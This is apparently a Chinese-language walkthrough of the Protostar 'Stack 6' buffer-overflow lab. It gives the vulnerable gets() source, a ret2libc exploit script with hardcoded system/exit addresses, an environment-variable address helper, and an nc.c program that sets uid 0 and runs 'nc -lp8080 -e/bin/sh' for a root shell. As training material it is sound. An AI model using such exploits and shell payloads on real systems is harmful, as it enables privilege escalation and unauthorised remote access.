# Stack 6

## （一） 题目：

\#include &lt;stdlib.h&gt;

\#include &lt;unistd.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;string.h&gt;

void getpath\(\)

{

char buffer\[64\];

unsigned int ret;

printf\("input path please: "\); fflush\(stdout\);

gets\(buffer\);

ret = \_\_builtin\_return\_address\(0\);

if\(\(ret & 0xbf000000\) == 0xbf000000\) {

```
printf\("bzzzt \(%p\)\n", ret\);

\_exit\(1\);
```

}

printf\("got path %s\n", buffer\);

}

int main\(int argc, char \*\*argv\)

{

getpath\(\);

}

## （二）解题过程：

这个是典型的的ROP ，绕过栈保护的一种方法。ret2libc意思是返回到c库。调用system函数执行/bin/sh 然后用exit\(\)退出。最终攻击的payload会是：

填充padding --&gt; system（）地址--&gt;exit\(\)地址----&gt;/bin/sh

1\)判断stack6是否有suid权限

![](/png/26.png)

stack6 有suid权限。

2）首先，调用system后，需要执行/bin/sh.要实现这个，需要两步：

把/bin/sh放到环境变量里 $shell

然后system（）调用该变量。

方法：

export SHELL=/bin/sh

echo $SHELL

要想得到变量$SHELL的地址，需要用到gdb调试器

b main  在main函数下断点。

r   运行

查看环境变量的地址和值

x/s \* \(\(char \*\*\)environ+x\)   x是一个数字，然后就打印出相应的变量地址

![](/png/27.png)

3）知道了变量的地址后，来获取漏洞溢出的偏移位置。

![](/png/28.png)

4）gdb 执行进入输入路径填充

![](/png/29.png)

溢出点出现。

![](/png/30.png)

偏移80的地方。此时查看system\(\)和exit\(\)地址

![](/png/31.png)

5）编写漏洞利用代码exploit.py

```
结构如下：
```

import struct

buff = 'A'\*80

system = struct.pack\("I",0xb7ecffb0\)

exit = struct.pack\("I",0xb7ec60c0\)

shell = struct.pack\("I",0xbfffff82\)

print buff+system+exit+shell

![](/png/32.png)

We have to remember that the address of `SHELL`is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. `python /tmp/stack6.py > /tmp/payload` , Then we will cat the file and pipe the output to `./stack6`

难点在于需要调整SHELL变量的地址。测试了好几次没找到正好地。明天接着试试。

![](/png/33.png)

测试中发现可能是环境变量选择的问题。尝试换一个环境变量执行TTE="whoami"

另外环境变量地址的获取方法最好使用程序老获取，gdb获取的不准确，不好调整。

export TTE="whoami"

获取环境变量地址的c代码如下：

getaddress.c

![](/png/34.png)

\#include &lt;stdio.h&gt;

\#include &lt;stdlib.h&gt;

\#include &lt;string.h&gt;

int main\(int argc, char \*argv\[\]\) {

```
            char \*ptr;

            if\(argc &lt; 3\) {

                            printf\("Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n", argv\[0\]\);

                            exit\(0\);

            }

            ptr = getenv\(argv\[1\]\); /\* get env var location \*/

            ptr += \(strlen\(argv\[0\]\) - strlen\(argv\[2\]\)\)\*2; /\* adjust for program name \*/

            printf\("%s will be at %p\n", argv\[1\], ptr\);
```

![](/png/35.png)

stack6.py 的脚本如下：

![](/png/36.png)

根据反馈信息，地址做了微调。程序最后返回root.

那么，现在做一下验证，再把TTE环境变量改回"/bin/sh"试，不好用。为了得到一个shell，我们采用将环境变量设置为可以反弹shell的nc程序。

在/tmp目录下编写nc.c

\#include &lt;stdlib.h&gt;

int main\(int argc, char \*\*argv, char \*\*envp\) {

```
setuid\(0\); // These two are necessary, as system\(\) drops privileges

setgid\(0\);

char \*args\[\] = {  "nc", "-lp8080", "-e/bin/sh", \(char \*\) 0 };

execve\("/bin/nc", args, envp\);
```

}

在/tmp目录下运行得到nc

设置环境变量 RUN

export RUN=///////////////////tmp/nc

利用上面取环境变脸地址的程序/tmp/addr RUN ./stack6获取环境变量地址

然后修改stack6.py脚本地址就可以了。

在kali下监听7777端口，成功。

nc.c

![](/png/39.png)

利用addr获取变量run地址

![](/png/38.png)

![](/png/37.png)



ref：

[https://blog.csdn.net/stonesharp/article/details/38402953?utm\_source=blogxgwz4](https://blog.csdn.net/stonesharp/article/details/38402953?utm_source=blogxgwz4)

[https://programlife.net/](https://programlife.net/)

[https://0xrick.github.io/binary-exploitation/bof6/](https://0xrick.github.io/binary-exploitation/bof6/)

[https://www.shellblade.net/posts.html](https://www.shellblade.net/posts.html)

[http://louisrli.github.io/blog/2012/08/28/protostar-stack2/\#.XXHf9WZ5v\_V](http://louisrli.github.io/blog/2012/08/28/protostar-stack2/#.XXHf9WZ5v_V)

